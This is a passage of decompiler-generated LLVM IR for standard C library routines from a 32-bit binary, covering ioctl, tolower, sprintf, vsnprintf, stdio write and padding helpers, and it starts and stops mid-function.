  %v1_804dc9b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_804dc9b = call i32 @__GI_fclose(i16* %v1_804dc9b)
  store i32 %v2_804dc9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dcad

dec_label_pc_804dcad:                             ; preds = %dec_label_pc_804dbe0, %dec_label_pc_804d9fd, %dec_label_pc_804da09, %dec_label_pc_804da27, %dec_label_pc_804da3a, %dec_label_pc_804da46, %dec_label_pc_804da4f, %dec_label_pc_804da79, %dec_label_pc_804dc8d, %dec_label_pc_804dc94, %dec_label_pc_804daaf
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804dc8d ], [ %stack_var_-28.1, %dec_label_pc_804dc94 ], [ %v2_804dabe, %dec_label_pc_804daaf ], [ 34, %dec_label_pc_804da79 ], [ 34, %dec_label_pc_804da4f ], [ 34, %dec_label_pc_804da46 ], [ 34, %dec_label_pc_804da3a ], [ 34, %dec_label_pc_804da27 ], [ 34, %dec_label_pc_804da09 ], [ 34, %dec_label_pc_804d9fd ], [ %stack_var_-28.0.ph131, %dec_label_pc_804dbe0 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_804d9e8, i32* @ebx, align 4
  store i32 %v0_804d9e7, i32* @esi, align 4
  store i32 %v0_804d9e6, i32* @edi, align 4
  store i32 %v0_804d9e5, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_804dc22, { 0, 2, 1 }
  uselistorder i32 %v5_804dc16, { 1, 2, 0 }
  uselistorder i32 %v0_804dc0d, { 1, 0 }
  uselistorder i8 %v2_804db9795, { 1, 2, 0 }
  uselistorder i8* %v1_804db9794, { 1, 0 }
  uselistorder i32 %v0_804db9747, { 1, 0 }
  uselistorder i32 %v2_804dbbd, { 1, 0 }
  uselistorder i32 %v1_804dbb6, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804dbc0.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804dbab, { 1, 0 }
  uselistorder i32 %v0_804dbab, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804db9d, { 1, 0 }
  uselistorder i8* %v4_804dc16, { 1, 0 }
  uselistorder i32 %v4_804dc79, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_804da3a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804da15, { 1, 0 }
  uselistorder i32 %v1_804d9f8, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804dcad, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804dc8d, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804dc73.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804dc29, { 1, 0 }
  uselistorder label %dec_label_pc_804dc0d, { 1, 0 }
  uselistorder label %dec_label_pc_804dbd0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804db97.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dbbd, { 1, 0 }
  uselistorder label %dec_label_pc_804db8b, { 1, 0 }
  uselistorder label %dec_label_pc_804db74, { 1, 0 }
  uselistorder label %dec_label_pc_804db74.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804db5d, { 1, 0 }
  uselistorder label %dec_label_pc_804db22, { 1, 0 }
  uselistorder label %dec_label_pc_804da79, { 1, 0 }
  uselistorder label %dec_label_pc_804da09, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804dcbc = load i32, i32* @edi, align 4
  store i32 %v0_804dcbc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804dcd4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804dcdc = call i32 @ioctl(i32 %v0_804dcd4, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804dcd4, i32* @ebx, align 4
  store i32 %v3_804dcdc, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_804dcdc, -4095
  br i1 %tmp11, label %dec_label_pc_804dcf4, label %dec_label_pc_804dce8

dec_label_pc_804dce8:                             ; preds = %entry
  %v1_804dce8 = call i32 @__errno_location(i32 %v0_804dcd4)
  %v0_804dced = load i32, i32* %edi.global-to-local, align 4
  %v1_804dced = sub i32 0, %v0_804dced
  %v2_804dcef = inttoptr i32 %v1_804dce8 to i32*
  store i32 %v1_804dced, i32* %v2_804dcef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dcf4

dec_label_pc_804dcf4:                             ; preds = %entry, %dec_label_pc_804dce8
  %v0_804dcf4 = phi i32 [ %v3_804dcdc, %entry ], [ -1, %dec_label_pc_804dce8 ]
  %v2_804dcf9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dcf9, i32* @edi, align 4
  ret i32 %v0_804dcf4

; uselistorder directives
  uselistorder i32 %v3_804dcdc, { 1, 0, 2 }
  uselistorder i32 %v0_804dcd4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 1, 0 }
  uselistorder label %dec_label_pc_804dcf4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804dd00 = add i32 %arg1, 128
  %v6_804dd0b = icmp ugt i32 %v1_804dd00, 383
  br i1 %v6_804dd0b, label %dec_label_pc_804dd16, label %dec_label_pc_804dd0d

dec_label_pc_804dd0d:                             ; preds = %entry
  %v0_804dd0d = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  %v2_804dd12 = mul i32 %arg1, 2
  %v3_804dd12 = add i32 %v0_804dd0d, %v2_804dd12
  %v4_804dd12 = inttoptr i32 %v3_804dd12 to i16*
  %v5_804dd12 = load i16, i16* %v4_804dd12, align 2
  %v6_804dd12 = sext i16 %v5_804dd12 to i32
  store i32 %v6_804dd12, i32* @edx, align 4
  br label %dec_label_pc_804dd16

dec_label_pc_804dd16:                             ; preds = %entry, %dec_label_pc_804dd0d
  %v0_804dd16 = phi i32 [ %arg1, %entry ], [ %v6_804dd12, %dec_label_pc_804dd0d ]
  ret i32 %v0_804dd16

; uselistorder directives
  uselistorder label %dec_label_pc_804dd16, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804dd1f = ptrtoint i32* %stack_var_12 to i32
  %v4_804dd32 = inttoptr i32 %arg1 to i8*
  %v5_804dd32 = call i32 @__GI_vsnprintf(i8* %v4_804dd32, i32 -1, i32 %arg2, i32 %v2_804dd1f)
  ret i32 %v5_804dd32
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dd3c = load i32, i32* @ebp, align 4
  %v0_804dd3d = load i32, i32* @edi, align 4
  %v0_804dd3e = load i32, i32* @esi, align 4
  %v0_804dd3f = load i32, i32* @ebx, align 4
  store i32 %v0_804dd3f, i32* %stack_var_-16, align 4
  %v4_804dd43 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804dd43, i32* @esi, align 4
  %v2_804dd47 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804dd78 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804dd78, i32* @ebp, align 4
  %v1_804dd7c = sub i32 -1, %v4_804dd43
  store i32 %v1_804dd7c, i32* @ebx, align 4
  %v1_804dd7f = call i32 @__stdio_init_mutex(i32 %v2_804dd47)
  %v0_804dd8f = load i32, i32* @ebx, align 4
  %v1_804dd8f = load i32, i32* @edi, align 4
  %tmp35 = icmp ugt i32 %v0_804dd8f, %v1_804dd8f
  br i1 %tmp35, label %dec_label_pc_804dd93, label %dec_label_pc_804dd95

dec_label_pc_804dd93:                             ; preds = %entry
  store i32 %v1_804dd8f, i32* @ebx, align 4
  br label %dec_label_pc_804dd95

dec_label_pc_804dd95:                             ; preds = %entry, %dec_label_pc_804dd93
  %v1_804dd95 = phi i32 [ %v0_804dd8f, %entry ], [ %v1_804dd8f, %dec_label_pc_804dd93 ]
  %v0_804dd95 = load i32, i32* @esi, align 4
  %v2_804dd95 = add i32 %v0_804dd95, %v1_804dd95
  %v4_804ddc0 = inttoptr i32 %arg3 to i8*
  %v5_804ddc0 = call i32 @_vfprintf_internal(i32 %v2_804dd78, i8* %v4_804ddc0, i32 %arg4, i32 %v2_804dd95)
  store i32 %v5_804ddc0, i32* %edx.global-to-local, align 4
  %v0_804ddca = load i32, i32* @ebx, align 4
  %v1_804ddca = icmp eq i32 %v0_804ddca, 0
  br i1 %v1_804ddca, label %dec_label_pc_804dde4, label %dec_label_pc_804ddce

dec_label_pc_804ddce:                             ; preds = %dec_label_pc_804dd95
  %v16_804ddd2 = icmp eq i32 %v1_804dd95, 0
  %v1_804ddd6 = icmp eq i1 %v16_804ddd2, false
  br i1 %v1_804ddd6, label %dec_label_pc_804dddd, label %dec_label_pc_804ddd8

dec_label_pc_804ddd8:                             ; preds = %dec_label_pc_804ddce
  %v1_804ddd8 = add i32 %v2_804dd95, -1
  br label %dec_label_pc_804dddd

dec_label_pc_804dddd:                             ; preds = %dec_label_pc_804ddce, %dec_label_pc_804ddd8
  %stack_var_-80.0.in = phi i32 [ %v0_804dd95, %dec_label_pc_804ddce ], [ %v1_804ddd8, %dec_label_pc_804ddd8 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804dde7.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804dde4

dec_label_pc_804dde4:                             ; preds = %dec_label_pc_804dd95, %dec_label_pc_804dddd
  %v0_804dde7 = phi i32 [ %v5_804ddc0, %dec_label_pc_804dd95 ], [ %v0_804dde7.pre, %dec_label_pc_804dddd ]
  %v2_804dde9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dde9, i32* @ebx, align 4
  store i32 %v0_804dd3e, i32* @esi, align 4
  store i32 %v0_804dd3d, i32* @edi, align 4
  store i32 %v0_804dd3c, i32* @ebp, align 4
  ret i32 %v0_804dde7

; uselistorder directives
  uselistorder i32 %v0_804dd95, { 1, 0 }
  uselistorder i32 %v1_804dd95, { 1, 0 }
  uselistorder i32 %v1_804dd8f, { 1, 2, 0 }
  uselistorder i32 %v0_804dd8f, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804dde4, { 1, 0 }
  uselistorder label %dec_label_pc_804dddd, { 1, 0 }
  uselistorder label %dec_label_pc_804dd95, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804ddf1 = load i32, i32* @edi, align 4
  %v0_804ddf3 = load i32, i32* @ebx, align 4
  %v4_804ddf7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ddf7, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804de034 = icmp eq i32 %arg3, 0
  br i1 %v1_804de034, label %dec_label_pc_804de62, label %dec_label_pc_804de08.lr.ph

dec_label_pc_804de08.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804de08

dec_label_pc_804de08:                             ; preds = %dec_label_pc_804de27.dec_label_pc_804de08_crit_edge, %dec_label_pc_804de08.lr.ph
  %v0_804de18 = phi i32 [ %v4_804ddf7, %dec_label_pc_804de08.lr.ph ], [ %v0_804de18.pre, %dec_label_pc_804de27.dec_label_pc_804de08_crit_edge ]
  %v0_804de17 = phi i32 [ %arg2, %dec_label_pc_804de08.lr.ph ], [ %v2_804de29, %dec_label_pc_804de27.dec_label_pc_804de08_crit_edge ]
  %v0_804de0a.in = phi i32 [ %arg3, %dec_label_pc_804de08.lr.ph ], [ %v2_804de27, %dec_label_pc_804de27.dec_label_pc_804de08_crit_edge ]
  %v0_804de0a = icmp slt i32 %v0_804de0a.in, 0
  store i32 %v0_804de0a.in, i32* %ebp.global-to-local, align 4
  %v2_804de0a = icmp eq i1 %v0_804de0a, false
  %storemerge = select i1 %v2_804de0a, i32 %v0_804de0a.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804de18 = add i32 %v0_804de18, 4
  %v2_804de18 = inttoptr i32 %v1_804de18 to i32*
  %v3_804de18 = load i32, i32* %v2_804de18, align 4
  %tmp36 = inttoptr i32 %v0_804de17 to i32*
  %v5_804de1b = call i32 @__libc_write(i32 %v3_804de18, i32* %tmp36, i32 %storemerge)
  store i32 %v5_804de1b, i32* %eax.global-to-local, align 4
  %v2_804de23 = icmp slt i32 %v5_804de1b, 0
  br i1 %v2_804de23, label %dec_label_pc_804de2d, label %dec_label_pc_804de27

dec_label_pc_804de27:                             ; preds = %dec_label_pc_804de08
  %v0_804de27 = load i32, i32* @ebx, align 4
  %v2_804de27 = sub i32 %v0_804de27, %v5_804de1b
  %v12_804de27 = icmp eq i32 %v2_804de27, 0
  store i32 %v2_804de27, i32* @ebx, align 4
  %v0_804de29 = load i32, i32* %esi.global-to-local, align 4
  %v2_804de29 = add i32 %v0_804de29, %v5_804de1b
  store i32 %v2_804de29, i32* %esi.global-to-local, align 4
  br i1 %v12_804de27, label %dec_label_pc_804de62, label %dec_label_pc_804de27.dec_label_pc_804de08_crit_edge

dec_label_pc_804de27.dec_label_pc_804de08_crit_edge: ; preds = %dec_label_pc_804de27
  %v0_804de18.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804de08

dec_label_pc_804de2d:                             ; preds = %dec_label_pc_804de08
  %v0_804de2d = load i32, i32* @edi, align 4
  %v1_804de2d = add i32 %v0_804de2d, 8
  %v2_804de2d = inttoptr i32 %v1_804de2d to i32*
  %v3_804de2d = load i32, i32* %v2_804de2d, align 4
  store i32 %v3_804de2d, i32* @edx, align 4
  %v1_804de30 = add i32 %v0_804de2d, 12
  %v2_804de30 = inttoptr i32 %v1_804de30 to i32*
  %v3_804de30 = load i32, i32* %v2_804de30, align 4
  store i32 %v3_804de30, i32* %eax.global-to-local, align 4
  %v1_804de33 = inttoptr i32 %v0_804de2d to i16*
  %v2_804de33 = load i16, i16* %v1_804de33, align 2
  %v3_804de33 = or i16 %v2_804de33, 8
  store i16 %v3_804de33, i16* %v1_804de33, align 2
  %v0_804de37 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de37 = load i32, i32* @edx, align 4
  %v2_804de37 = sub i32 %v0_804de37, %v1_804de37
  %v12_804de37 = icmp eq i32 %v2_804de37, 0
  store i32 %v2_804de37, i32* %eax.global-to-local, align 4
  %v4_804de5e.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804de37, label %dec_label_pc_804de5e, label %dec_label_pc_804de3b

dec_label_pc_804de3b:                             ; preds = %dec_label_pc_804de2d
  %v6_804de3d = icmp ugt i32 %v2_804de37, %v4_804de5e.pre
  br i1 %v6_804de3d, label %dec_label_pc_804de41.preheader, label %dec_label_pc_804de3f

dec_label_pc_804de3f:                             ; preds = %dec_label_pc_804de3b
  store i32 %v2_804de37, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804de41.preheader

dec_label_pc_804de41.preheader:                   ; preds = %dec_label_pc_804de3f, %dec_label_pc_804de3b
  %v0_804de41.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804de41

dec_label_pc_804de41:                             ; preds = %dec_label_pc_804de41.preheader, %dec_label_pc_804de53
  %v2_804de43 = phi i32 [ %v1_804de37, %dec_label_pc_804de41.preheader ], [ %v1_804de4f, %dec_label_pc_804de53 ]
  %v4_804de41 = phi i32 [ %v2_804de37, %dec_label_pc_804de41.preheader ], [ %v0_804de45, %dec_label_pc_804de53 ]
  %v0_804de41 = phi i32 [ %v0_804de41.pre, %dec_label_pc_804de41.preheader ], [ %v1_804de53, %dec_label_pc_804de53 ]
  %v1_804de41 = inttoptr i32 %v0_804de41 to i8*
  %v2_804de41 = load i8, i8* %v1_804de41, align 1
  %v3_804de41 = zext i8 %v2_804de41 to i32
  %v5_804de41 = and i32 %v4_804de41, -256
  %v6_804de41 = or i32 %v3_804de41, %v5_804de41
  store i32 %v6_804de41, i32* %eax.global-to-local, align 4
  %v3_804de43 = inttoptr i32 %v2_804de43 to i8*
  store i8 %v2_804de41, i8* %v3_804de43, align 1
  %v0_804de45 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de45 = trunc i32 %v0_804de45 to i8
  %v10_804de45 = icmp eq i8 %v1_804de45, 10
  %v1_804de47 = icmp eq i1 %v10_804de45, false
  br i1 %v1_804de47, label %dec_label_pc_804de4f, label %dec_label_pc_804de49

dec_label_pc_804de49:                             ; preds = %dec_label_pc_804de41
  %v0_804de49 = load i32, i32* @edi, align 4
  %v1_804de49 = add i32 %v0_804de49, 1
  %v2_804de49 = inttoptr i32 %v1_804de49 to i8*
  %v3_804de49 = load i8, i8* %v2_804de49, align 1
  %v4_804de49 = urem i8 %v3_804de49, 2
  %v5_804de49 = icmp eq i8 %v4_804de49, 0
  %v1_804de4d = icmp eq i1 %v5_804de49, false
  br i1 %v1_804de4d, label %dec_label_pc_804de49.dec_label_pc_804de56_crit_edge, label %dec_label_pc_804de4f

dec_label_pc_804de49.dec_label_pc_804de56_crit_edge: ; preds = %dec_label_pc_804de49
  %v0_804de56.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804de56

dec_label_pc_804de4f:                             ; preds = %dec_label_pc_804de49, %dec_label_pc_804de41
  %v0_804de4f = load i32, i32* @edx, align 4
  %v1_804de4f = add i32 %v0_804de4f, 1
  store i32 %v1_804de4f, i32* @edx, align 4
  %v0_804de50 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804de50 = add i32 %v0_804de50, -1
  %v8_804de50 = icmp eq i32 %v1_804de50, 0
  store i32 %v1_804de50, i32* %ebp.global-to-local, align 4
  br i1 %v8_804de50, label %dec_label_pc_804de4f.dec_label_pc_804de56_crit_edge, label %dec_label_pc_804de53

dec_label_pc_804de4f.dec_label_pc_804de56_crit_edge: ; preds = %dec_label_pc_804de4f
  %v1_804de56.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804de56

dec_label_pc_804de53:                             ; preds = %dec_label_pc_804de4f
  %v0_804de53 = load i32, i32* %esi.global-to-local, align 4
  %v1_804de53 = add i32 %v0_804de53, 1
  store i32 %v1_804de53, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804de41

dec_label_pc_804de56:                             ; preds = %dec_label_pc_804de4f.dec_label_pc_804de56_crit_edge, %dec_label_pc_804de49.dec_label_pc_804de56_crit_edge
  %v1_804de56 = phi i32 [ %v0_804de49, %dec_label_pc_804de49.dec_label_pc_804de56_crit_edge ], [ %v1_804de56.pre, %dec_label_pc_804de4f.dec_label_pc_804de56_crit_edge ]
  %v0_804de56 = phi i32 [ %v0_804de56.pre, %dec_label_pc_804de49.dec_label_pc_804de56_crit_edge ], [ %v1_804de4f, %dec_label_pc_804de4f.dec_label_pc_804de56_crit_edge ]
  %v2_804de56 = add i32 %v1_804de56, 16
  %v3_804de56 = inttoptr i32 %v2_804de56 to i32*
  store i32 %v0_804de56, i32* %v3_804de56, align 4
  %v0_804de59 = load i32, i32* @edx, align 4
  %v1_804de59 = load i32, i32* @edi, align 4
  %v2_804de59 = add i32 %v1_804de59, 8
  %v3_804de59 = inttoptr i32 %v2_804de59 to i32*
  %v4_804de59 = load i32, i32* %v3_804de59, align 4
  %v5_804de59 = sub i32 %v0_804de59, %v4_804de59
  store i32 %v5_804de59, i32* @edx, align 4
  %v0_804de5c = load i32, i32* @ebx, align 4
  %v2_804de5c = sub i32 %v0_804de5c, %v5_804de59
  br label %dec_label_pc_804de5e

dec_label_pc_804de5e:                             ; preds = %dec_label_pc_804de2d, %dec_label_pc_804de56
  %v4_804de5e = phi i32 [ %v2_804de5c, %dec_label_pc_804de56 ], [ %v4_804de5e.pre, %dec_label_pc_804de2d ]
  %v5_804de5e = sub i32 %arg3, %v4_804de5e
  br label %dec_label_pc_804de62

dec_label_pc_804de62:                             ; preds = %dec_label_pc_804de27, %entry, %dec_label_pc_804de5e
  %stack_var_12.0 = phi i32 [ %v5_804de5e, %dec_label_pc_804de5e ], [ 0, %entry ], [ %arg3, %dec_label_pc_804de27 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_804ddf3, i32* @ebx, align 4
  store i32 %v0_804ddf1, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804de53, { 1, 0 }
  uselistorder i32 %v1_804de50, { 1, 0 }
  uselistorder i32 %v1_804de4f, { 0, 2, 1 }
  uselistorder i32 %v0_804de45, { 1, 0 }
  uselistorder i32 %v2_804de29, { 1, 0 }
  uselistorder i32 %v2_804de27, { 1, 2, 0 }
  uselistorder i32 %v5_804de1b, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804de62, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804de5e, { 1, 0 }
  uselistorder label %dec_label_pc_804de41, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804de70 = load i32, i32* @edi, align 4
  %v0_804de71 = load i32, i32* @esi, align 4
  %v0_804de72 = load i32, i32* @ebx, align 4
  %v0_804de73 = load i32, i32* @eax, align 4
  store i32 %v0_804de73, i32* @edi, align 4
  %v0_804de78 = load i32, i32* @ecx, align 4
  store i32 %v0_804de78, i32* @esi, align 4
  store i32 %v0_804de78, i32* @ebx, align 4
  %v0_804de7c = load i32, i32* @edx, align 4
  store i32 %v0_804de7c, i32* %stack_var_-13, align 4
  %v1_804de832 = icmp eq i32 %v0_804de78, 0
  br i1 %v1_804de832, label %dec_label_pc_804de9b, label %dec_label_pc_804de87.lr.ph

dec_label_pc_804de87.lr.ph:                       ; preds = %entry
  %v2_804de87 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804de87

dec_label_pc_804de82:                             ; preds = %dec_label_pc_804de87
  %v1_804de82 = add i32 %v0_804de82, -1
  %v8_804de82 = icmp eq i32 %v1_804de82, 0
  store i32 %v1_804de82, i32* @ebx, align 4
  br i1 %v8_804de82, label %dec_label_pc_804de9b.loopexit, label %dec_label_pc_804de82.dec_label_pc_804de87_crit_edge

dec_label_pc_804de82.dec_label_pc_804de87_crit_edge: ; preds = %dec_label_pc_804de82
  %v0_804de8b.pre = load i32, i32* @edx, align 4
  %v0_804de8c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804de87

dec_label_pc_804de87:                             ; preds = %dec_label_pc_804de82.dec_label_pc_804de87_crit_edge, %dec_label_pc_804de87.lr.ph
  %v0_804de8c = phi i32 [ %v0_804de8c.pre, %dec_label_pc_804de82.dec_label_pc_804de87_crit_edge ], [ %v0_804de73, %dec_label_pc_804de87.lr.ph ]
  %v0_804de8b = phi i32 [ %v0_804de8b.pre, %dec_label_pc_804de82.dec_label_pc_804de87_crit_edge ], [ %v0_804de7c, %dec_label_pc_804de87.lr.ph ]
  %v4_804de90 = call i32 @__stdio_fwrite(i32 %v2_804de87, i32 1, i32 %v0_804de8c, i32 %v0_804de8b)
  %v8_804de98 = icmp eq i32 %v4_804de90, 1
  %v0_804de82 = load i32, i32* @ebx, align 4
  br i1 %v8_804de98, label %dec_label_pc_804de82, label %dec_label_pc_804de9b.loopexit

dec_label_pc_804de9b.loopexit:                    ; preds = %dec_label_pc_804de82, %dec_label_pc_804de87
  %v1_804de9b.ph = phi i32 [ %v0_804de82, %dec_label_pc_804de87 ], [ 0, %dec_label_pc_804de82 ]
  %v0_804de9b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804de9b

dec_label_pc_804de9b:                             ; preds = %dec_label_pc_804de9b.loopexit, %entry
  %v0_804de9b = phi i32 [ 0, %entry ], [ %v0_804de9b.pre, %dec_label_pc_804de9b.loopexit ]
  %v1_804de9b = phi i32 [ 0, %entry ], [ %v1_804de9b.ph, %dec_label_pc_804de9b.loopexit ]
  %v2_804de9b = sub i32 %v0_804de9b, %v1_804de9b
  store i32 %v0_804de72, i32* @ebx, align 4
  store i32 %v0_804de71, i32* @esi, align 4
  store i32 %v0_804de70, i32* @edi, align 4
  ret i32 %v2_804de9b

; uselistorder directives
  uselistorder i32 %v1_804de82, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804de9b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804deb9 = trunc i32 %arg2 to i8
  %v5_804deb9 = icmp slt i8 %v3_804deb9, 0
  %v1_804debb = icmp eq i1 %v5_804deb9, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804debb, label %dec_label_pc_804deec, label %dec_label_pc_804debd

dec_label_pc_804debd:                             ; preds = %entry
  %v3_804dec4 = call i32 @strlen(i8* %arg4)
  %v0_804decc = load i32, i32* @ebx, align 4
  %v2_804decc = sub i32 %v0_804decc, %v3_804dec4
  store i32 %v2_804decc, i32* @ebx, align 4
  store i32 %v3_804dec4, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804decc, 1
  br i1 %tmp23, label %dec_label_pc_804deea, label %dec_label_pc_804ded4

dec_label_pc_804ded4:                             ; preds = %dec_label_pc_804debd
  %v0_804ded4 = load i32, i32* @edi, align 4
  %v1_804ded4 = urem i32 %v0_804ded4, 128
  store i32 %v1_804ded4, i32* @edi, align 4
  store i32 %v2_804decc, i32* @ecx, align 4
  store i32 %v1_804ded4, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804dedf = call i32 @_charpad()
  store i32 %v0_804dedf, i32* @ebp, align 4
  %v12_804dee6 = icmp eq i32 %v0_804dedf, %v2_804decc
  %v1_804dee8 = icmp eq i1 %v12_804dee6, false
  br i1 %v1_804dee8, label %dec_label_pc_804df06, label %dec_label_pc_804ded4.dec_label_pc_804deea_crit_edge

dec_label_pc_804ded4.dec_label_pc_804deea_crit_edge: ; preds = %dec_label_pc_804ded4
  %v0_804deea.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804deea

dec_label_pc_804deea:                             ; preds = %dec_label_pc_804ded4.dec_label_pc_804deea_crit_edge, %dec_label_pc_804debd
  %v0_804deea = phi i32 [ %v0_804deea.pre, %dec_label_pc_804ded4.dec_label_pc_804deea_crit_edge ], [ %v3_804dec4, %dec_label_pc_804debd ]
  store i32 %v0_804deea, i32* @ebx, align 4
  br label %dec_label_pc_804deec

dec_label_pc_804deec:                             ; preds = %entry, %dec_label_pc_804deea
  %v0_804def7 = phi i32 [ %arg3, %entry ], [ %v0_804deea, %dec_label_pc_804deea ]
  %tmp24 = icmp slt i32 %v0_804def7, 1
  br i1 %tmp24, label %dec_label_pc_804df04, label %dec_label_pc_804def2

dec_label_pc_804def2:                             ; preds = %dec_label_pc_804deec
  %v0_804def2 = load i32, i32* @ecx, align 4
  %v5_804defc = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804def7, i32 %arg1, i32 %v0_804def2)
  br label %dec_label_pc_804df04

dec_label_pc_804df04:                             ; preds = %dec_label_pc_804deec, %dec_label_pc_804def2
